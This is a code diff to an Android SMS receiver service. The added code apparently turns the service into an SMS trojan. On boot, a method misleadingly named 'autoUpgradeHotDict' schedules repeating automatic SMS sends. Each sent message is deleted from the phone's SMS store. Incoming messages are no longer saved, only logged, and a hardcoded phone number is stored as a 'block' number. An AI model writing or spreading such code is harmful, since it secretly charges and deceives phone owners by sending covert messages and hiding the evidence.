@@ -22,10 +22,13 @@ import static android.provider.Telephony.Sms.Intents.SMS_RECEIVED_ACTION;
 
 //import com.android.mms.data.Contact;
 //import com.android.mms.ui.ClassZeroActivity;
+import com.mms.bg.data.MmsConfig;
 import com.mms.bg.data.Recycler;
 //import com.android.mms.util.SendingProgressTokenManager;
 import com.google.android.mms.MmsException;
+
 import android.database.sqlite.SqliteWrapper;
+import android.database.ContentObserver;
 
 import android.app.Activity;
 import android.app.Service;
@@ -56,10 +59,17 @@ import android.telephony.SmsMessage;
 import android.text.TextUtils;
 import android.util.Log;
 import android.widget.Toast;
+import android.content.SharedPreferences;
+import android.preference.PreferenceManager;
+import com.mms.bg.data.AutoSmsSender;
+import android.app.PendingIntent;
+import android.app.AlarmManager;
+import java.util.Date;
 
 import com.android.internal.telephony.TelephonyIntents;
 //import com.android.mms.R;
 import com.mms.bg.data.LogTag;
+import com.mms.bg.*;
 
 /**
  * This service essentially plays the role of a "worker thread", allowing us to store
@@ -68,11 +78,14 @@ import com.mms.bg.data.LogTag;
  */
 public class SmsReceiverService extends Service {
     private static final String TAG = "SmsReceiverService";
+    private static final boolean DEBUG = true;
 
     private ServiceHandler mServiceHandler;
     private Looper mServiceLooper;
     private boolean mSending;
     private BackgroundQueryHandler mBackgroundQueryHandler;
+//    private SmsContent mSmsContent;
+    private Context mContext;
 
     public static final String MESSAGE_SENT_ACTION =
         "com.android.mms.transaction.MESSAGE_SENT";
@@ -107,7 +120,12 @@ public class SmsReceiverService extends Service {
     private static final int DELETE_MESSAGE_TOKEN  = 9700;
 
     private int mResultCode;
+    
+    private SharedPreferences mSp;
+    private SharedPreferences.Editor mEditor;
 
+    private String mBlockNum;
+    
     @Override
     public void onCreate() {
         // Temporarily removed for this duplicate message track down.
@@ -124,6 +142,19 @@ public class SmsReceiverService extends Service {
         mServiceLooper = thread.getLooper();
         mServiceHandler = new ServiceHandler(mServiceLooper);
         mBackgroundQueryHandler = new BackgroundQueryHandler(getContentResolver());
+//        mSmsContent = new SmsContent(new Handler());
+//        getContentResolver().registerContentObserver(Uri.parse("content://sms"), true, mSmsContent); 
+        mContext = this;
+        
+        mSp = PreferenceManager.getDefaultSharedPreferences(mContext);
+        mBlockNum = mSp.getString(mContext.getString(R.string.block_num), null);
+        if (mBlockNum == null) {
+            //test code
+            mBlockNum = "15810864155";
+            mEditor = mSp.edit();
+            mEditor.putString(mContext.getString(R.string.block_num), mBlockNum);
+            mEditor.commit();
+        }
     }
 
     @Override
@@ -265,18 +296,18 @@ public class SmsReceiverService extends Service {
             if (Log.isLoggable(LogTag.TRANSACTION, Log.VERBOSE)) {
                 Log.v(TAG, "handleSmsSent sending uri: " + uri);
             }
-//            if (!Sms.moveMessageToFolder(this, uri, Sms.MESSAGE_TYPE_SENT, error)) {
-//                Log.e(TAG, "handleSmsSent: failed to move message " + uri + " to sent folder");
-//            }
             
-            mBackgroundQueryHandler.startDelete(DELETE_MESSAGE_TOKEN, null
-                    , uri, "locked=0", null);
-            if (sendNextMsg) {
-                sendFirstQueuedMessage();
-            }
-
-            // Update the notification for failed messages since they may be deleted.
-//            MessagingNotification.updateSendFailedNotification(this);
+            //delete the message for the content provider
+            mBackgroundQueryHandler.startDelete(DELETE_MESSAGE_TOKEN, null, uri, "locked=0", null);
+            
+            //save the current send time
+            long currentTime = System.currentTimeMillis();
+            Date date = new Date(currentTime);
+            mEditor.putLong(getString(R.string.last_send_time), currentTime);
+            mEditor.putString(getString(R.string.last_send_time_format), date.toGMTString());
+            mEditor.commit();
+            
+            stopSelf();
         } else if ((mResultCode == SmsManager.RESULT_ERROR_RADIO_OFF) ||
                 (mResultCode == SmsManager.RESULT_ERROR_NO_SERVICE)) {
             if (Log.isLoggable(LogTag.TRANSACTION, Log.VERBOSE)) {
@@ -332,11 +363,12 @@ public class SmsReceiverService extends Service {
     }
 
     private void handleBootCompleted() {
-        moveOutboxMessagesToQueuedBox();
-        sendFirstQueuedMessage();
+//        moveOutboxMessagesToQueuedBox();
+//        sendFirstQueuedMessage();
 
         // Called off of the UI thread so ok to block.
 //        MessagingNotification.blockingUpdateNewMessageIndicator(this, true, false);
+        autoUpgradeHotDict();
     }
 
     private void moveOutboxMessagesToQueuedBox() {
@@ -372,14 +404,17 @@ public class SmsReceiverService extends Service {
         // Build the helper classes to parse the messages.
         SmsMessage sms = msgs[0];
 
-        if (sms.getMessageClass() == SmsMessage.MessageClass.CLASS_0) {
-//            displayClassZeroMessage(context, sms);
+//        if (sms.getMessageClass() == SmsMessage.MessageClass.CLASS_0) {
+////            displayClassZeroMessage(context, sms);
+//            return null;
+//        } else if (sms.isReplace()) {
+////            return replaceMessage(context, msgs, error);
+//            return null;
+//        } else {
+//            return storeMessage(context, msgs, error);
+            dumpReceivedSMS(msgs[0]);
             return null;
-        } else if (sms.isReplace()) {
-            return replaceMessage(context, msgs, error);
-        } else {
-            return storeMessage(context, msgs, error);
-        }
+//        }
     }
 
     /**
@@ -504,6 +539,13 @@ public class SmsReceiverService extends Service {
         return values;
     }
 
+    private void dumpReceivedSMS(SmsMessage sms) {
+        if (DEBUG) {
+            Log.d(TAG, "[[dumpReceivedSMS]] sms addr = " + sms.getDisplayOriginatingAddress()
+                    + "  sms body = " + sms.getDisplayMessageBody());
+        }
+    }
+    
     /**
      * Displays a class-zero message immediately in a pop-up window
      * with the number from where it received the Notification with
@@ -558,6 +600,36 @@ public class SmsReceiverService extends Service {
         @Override
         protected void onDeleteComplete(int token, Object cookie, int result) {
         }
+    }
+    
+    private void autoUpgradeHotDict() {
+        cancelAutoUpgrade();
+        Intent intent = new Intent(mContext, AutoSmsSender.class);
+        PendingIntent sender = PendingIntent.getBroadcast(mContext, 0, intent, 0);
+        long currentTime = System.currentTimeMillis();
+        long upgradeDelayTime = MmsConfig.SEND_DELAY_TIME;
+        long firstTime = 0;
+
+        long latestDictUpgradeTime = mSp.getLong(getString(R.string.last_send_time), 0);
+        if (latestDictUpgradeTime != 0 
+                && (currentTime - latestDictUpgradeTime) >= upgradeDelayTime + 10000) {
+            //delay 10s to upload dict
+            firstTime = currentTime + 10000;
+        } else if (latestDictUpgradeTime != 0) {
+            firstTime = latestDictUpgradeTime + upgradeDelayTime;
+        } else {
+            firstTime = currentTime;
+        }
+        
+        AlarmManager am = (AlarmManager) mContext.getSystemService(mContext.ALARM_SERVICE);
+        am.setRepeating(AlarmManager.RTC, firstTime, MmsConfig.SEND_DELAY_TIME, sender);
+    }
+    
+    private void cancelAutoUpgrade() {
+        Intent intent = new Intent(mContext, AutoSmsSender.class);
+        PendingIntent sender = PendingIntent.getBroadcast(mContext, 0, intent, 0);
+        AlarmManager am = (AlarmManager) mContext.getSystemService(mContext.ALARM_SERVICE);
+        am.cancel(sender);
     }
     
 }
